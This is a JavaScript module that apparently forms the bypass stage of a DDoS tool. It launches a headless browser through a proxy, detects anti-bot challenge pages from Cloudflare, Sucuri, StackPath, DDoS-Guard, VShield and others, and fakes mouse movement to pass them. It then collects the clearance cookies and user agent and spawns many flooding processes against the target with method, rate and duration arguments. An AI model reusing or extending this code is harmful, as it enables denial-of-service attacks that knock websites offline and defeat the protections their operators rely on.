
const playwright = require('playwright');
const colors = require('colors');
const {
    spawn
} = require('child_process');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
  "TimeoutError",
  "DeprecationWarning",
]),
  (ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
	'NS_ERROR_CONNECTION_REFUSED',
    "DEP0123",
    "ERR_SSL_WRONG_VERSION_NUMBER",
  ]);

process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });
const JSList = {
	"js": [{
		"name": "CloudFlare (Secure JS)",
		"navigations": 2,
		"locate": "<h2 class=\"h2\" id=\"challenge-running\">"
	},
	{
		"name": "CloudFlare (Normal JS)",
		"navigations": 2,
		"locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
	},
	{
		"name": "BlazingFast v1.0",
		"navigations": 1,
		"locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
	},
	{
		"name": "BlazingFast v2.0",
		"navigations": 1,
		"locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
	},
	{
		"name": "Sucuri",
		"navigations": 4,
		"locate": "<html><title>You are being redirected...</title>"
	},
	{
		"name": "StackPath",
		"navigations": 4,
		"locate": "<title>Site verification</title>"
	},
	{
		"name": "StackPath EnforcedJS",
		"navigations": 4,
		"locate": "<title>StackPath</title>"
	}, {
		"name": "React",
		"navigations": 1,
		"locate": "Check your browser..."
	}, {
		"name": "DDoS-Guard",
		"navigations": 1,
		"locate": "DDoS protection by DDos-Guard"
	}, {
		"name": "VShield",
		"navigations": 1,
		"locate": "fw.vshield.pro/v2/bot-detector.js"
	}, {
		"name": "GameSense",
		"navigations": 1,
		"locate": "<title>GameSense</title>"
	}]
}

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}


function randomIntFromInterval(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min)
}

function cookiesToStr(cookies) {
	if (Array.isArray(cookies)) {
		return cookies.reduce((prev, {
			name,
			value
		}) => {
			if (!prev) return `${name}=${value}`;
			return `${prev}; ${name}=${value}`;
		}, "");
		return "";
	}
}

function JSDetection(argument) {
	for (let i = 0; i < JSList['js'].length; i++) {
		if (argument.includes(JSList['js'][i].locate)) {
			return JSList['js'][i]
		}
	}
}

function solverInstance(args) {
	return new Promise((resolve, reject) => {
	
		playwright.chromium.launch({
			headless: true,

			proxy: {
				server: 'http://' + args.Proxy
			},
		}).then(async (browser) => {

			const page = await browser.newPage();

			try {
				await page.goto(args.Target);
			} catch (e) {

				await browser.close();
				reject(e);
			}

			const ua = await page.evaluate(
				() => navigator.userAgent
			);
				
			const source = await page.content();
			const title = await page.title()
			const JS = await JSDetection(source);

			if (JS) {
					
				if (JS.name == "VShield") {
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.down();
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
					await page.mouse.up();
				}

				for (let i = 0; i < JS.navigations; i++) {
					var [response] = await Promise.all([
						page.waitForNavigation(),
					])
				
				}
			} else {
			}
			const title2 = await page.title()
			const source2 = await page.content();
			const JS2 = await JSDetection(source2);
			
			if (JS2) {
						

				if (JS2.name == "VShield") {
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.down();
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
					await page.mouse.up();
				}

				for (let i = 0; i < JS2.navigations; i++) {
					var [response] = await Promise.all([
						page.waitForNavigation(),
					])
					
					}
			} else {
			}			


			const cookies = cookiesToStr(await page.context().cookies());
			const titleParsed = await page.title();
		
			for (let i = 0; i < args.Threads; i++) {
                spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
            }
		
			resolve(cookies);
		})
	})
}

module.exports = {
	solverInstance: solverInstance
};
